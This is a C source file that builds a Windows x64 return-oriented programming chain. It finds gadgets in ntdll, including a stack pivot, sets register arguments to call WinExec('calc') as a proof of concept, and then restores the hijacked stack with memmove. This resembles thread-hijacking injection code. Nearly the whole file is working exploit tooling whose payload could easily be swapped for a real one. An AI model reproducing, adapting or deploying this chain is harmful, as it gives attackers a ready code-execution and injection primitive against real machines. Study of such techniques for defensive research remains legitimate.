#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// External functions
DWORD64 GadgetFinder(const void* const needle, const size_t needle_len);
DWORD NameToPID(const wchar_t* pProcessName);
BOOL GetVersionOs(OSVERSIONINFOEX* os);

#define check_Gadget(gadget, name) if (gadget == NULL) printf("[!] %s gadget returned null\n", name);
#define DONT_CARE 0

// Global gadgets
DWORD64 GADGET_loop, GADGET_popregs, GADGET_ret, GADGET_pivot, GADGET_addrsp;
DWORD64 GADGET_poprax, GADGET_poprdx, GADGET_poprcx, GADGET_popr8;
DWORD64 GADGET_movr8deax, GADGET_movsxd, GADGET_xchgeaxecx, GADGET_xorraxrax;

// ROP chain state
DWORD64* ROP_chain = NULL;
int rop_pos = 0;
DWORD64 saved_return_address = 0;

// Runtime parameters
typedef struct {
    DWORD64 orig_tos;
    DWORD64 tos;
    DWORD64 saved_return_address;
    DWORD64 GADGET_pivot;
    DWORD64 rop_pos;
} RuntimeParams;

void SetRcx(DWORD64 value)
{
    ROP_chain[rop_pos++] = GADGET_poprcx;
    ROP_chain[rop_pos++] = value;
}

void SetRdx(DWORD64 value)
{
    ROP_chain[rop_pos++] = GADGET_poprdx;
    ROP_chain[rop_pos++] = value;
}

void SetR8(DWORD64 value)
{
    if (GADGET_popr8)
    {
        ROP_chain[rop_pos++] = GADGET_popr8;
        ROP_chain[rop_pos++] = value;
    }
    else
    {
        ROP_chain[rop_pos++] = GADGET_poprax;
        ROP_chain[rop_pos++] = value;
        ROP_chain[rop_pos++] = GADGET_movr8deax;
    }
}

void SetR9(DWORD64 value)
{
    ROP_chain[rop_pos++] = GADGET_poprax;
    ROP_chain[rop_pos++] = value;
    ROP_chain[rop_pos++] = GADGET_movsxd;
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
}

void SetApi(DWORD64 winapi)
{
    ROP_chain[rop_pos++] = winapi;
    ROP_chain[rop_pos++] = GADGET_addrsp;
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // shadow space
    ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
}

void FunctionCall(DWORD64 api_func, DWORD64 rcx, DWORD64 rdx, DWORD64 r8, DWORD64 r9)
{
    SetRcx(rcx);
    SetRdx(rdx);
    SetR8(r8);
    SetR9(r9);
    SetApi(api_func);
}

DWORD FindGadgets()
{
    printf("[*] Searching for ROP gadgets...\n");

    GADGET_loop = GadgetFinder("\xEB\xFE", 2); // jmp -2
    check_Gadget(GADGET_loop, "GADGET_loop");

    GADGET_popregs = GadgetFinder("\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
    check_Gadget(GADGET_popregs, "GADGET_popregs");

    GADGET_ret = GadgetFinder("\xC3", 1); // ret;
    check_Gadget(GADGET_ret, "GADGET_ret");

    GADGET_pivot = GadgetFinder("\x5C\xC3", 2); // pop rsp; ret
    check_Gadget(GADGET_pivot, "GADGET_pivot");

    GADGET_addrsp = GadgetFinder("\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
    check_Gadget(GADGET_addrsp, "GADGET_addrsp");

    GADGET_poprax = GadgetFinder("\x58\xC3", 2); // pop rax; ret;
    check_Gadget(GADGET_poprax, "GADGET_poprax");

    GADGET_poprdx = GadgetFinder("\x5A\xC3", 2); // pop rdx; ret;
    check_Gadget(GADGET_poprdx, "GADGET_poprdx");

    GADGET_poprcx = GadgetFinder("\x59\xC3", 2); // pop rcx; ret;
    check_Gadget(GADGET_poprcx, "GADGET_poprcx");

    GADGET_popr8 = GadgetFinder("\x41\x58\xC3", 3); // pop r8; ret;
    check_Gadget(GADGET_popr8, "GADGET_popr8");

    GADGET_movr8deax = GadgetFinder("\x44\x8B\xC0\x41\x8B\xC0\x48\x83\xC4\x28\xC3", 11); // mov r8d, eax; mov eax, r8d; add rsp, 0x28; ret;
    check_Gadget(GADGET_movr8deax, "GADGET_movr8deax");

    GADGET_movsxd = GadgetFinder("\x4C\x63\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); // movsxd r9, eax; mov rax, r9; add rsp 0x28; ret
    check_Gadget(GADGET_movsxd, "GADGET_movsxd");

    GADGET_xchgeaxecx = GadgetFinder("\x91\xC3", 2); // xchg eax, ecx; ret;
    check_Gadget(GADGET_xchgeaxecx, "GADGET_xchgeaxecx");

    GADGET_xorraxrax = GadgetFinder("\x48\x33\xC0\xC3", 4); // xor rax, rax; ret;
    check_Gadget(GADGET_xorraxrax, "GADGET_xorraxrax");

    // Return with error if one of gadgets wasn't found
    if (GADGET_loop == 0 || GADGET_ret == 0 || GADGET_pivot == 0 || GADGET_addrsp == 0 ||
        GADGET_movr8deax == 0 || GADGET_poprax == 0 || GADGET_poprdx == 0 || GADGET_poprcx == 0 ||
        GADGET_popr8 == 0 || GADGET_movsxd == 0 || GADGET_xchgeaxecx == 0 || GADGET_xorraxrax == 0)
    {
        printf("[-] Failed to find all required gadgets\n");
        return 0;
    }

    printf("[+] All gadgets found successfully\n");
    return 1;
}

DWORD64* BuildPayload(RuntimeParams* runtime_parameters)
{
    LoadLibraryA("gdi32.dll");

    rop_pos = 0x0;

    HMODULE ntdll = GetModuleHandleA("ntdll");
    if (ntdll == NULL) return NULL;

    if (!FindGadgets()) return NULL;

    ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

    OSVERSIONINFOEX os_Info;
    os_Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionOs(&os_Info);

    // Force stack alignment
    if ((runtime_parameters->tos + 10 * sizeof(DWORD64)) & 0xF)
        ROP_chain[rop_pos++] = GADGET_ret;

    // Call WinExec("calc", SW_SHOW) as verifiable POC
    static char cmd[] = "calc";
    FunctionCall((DWORD64)WinExec, (DWORD64)cmd, 1, 0, 0);

    // STACK FIX - restore original stack
    SetRcx(runtime_parameters->orig_tos);

    ROP_chain[rop_pos++] = GADGET_poprdx;
    saved_return_address = rop_pos++; // rdx

    SetR8(8);
    SetR9(DONT_CARE);
    SetApi((DWORD64)GetProcAddress(ntdll, "memmove"));

    ROP_chain[rop_pos++] = GADGET_pivot;
    ROP_chain[rop_pos++] = runtime_parameters->orig_tos;

    // Store new TOS
    ROP_chain[saved_return_address] = runtime_parameters->tos + sizeof(DWORD64) * rop_pos;
    ROP_chain[rop_pos++] = DONT_CARE;

    printf("[*] ROP chain built (%d entries):\n", rop_pos);
    for (int count = 0; count < rop_pos; count++)
    {
        printf("    [%d] -> 0x%llx\n", count, ROP_chain[count]);
    }

    // Update runtime parameters
    runtime_parameters->saved_return_address = saved_return_address;
    runtime_parameters->GADGET_pivot = GADGET_pivot;
    runtime_parameters->rop_pos = rop_pos;

    return ROP_chain;
}
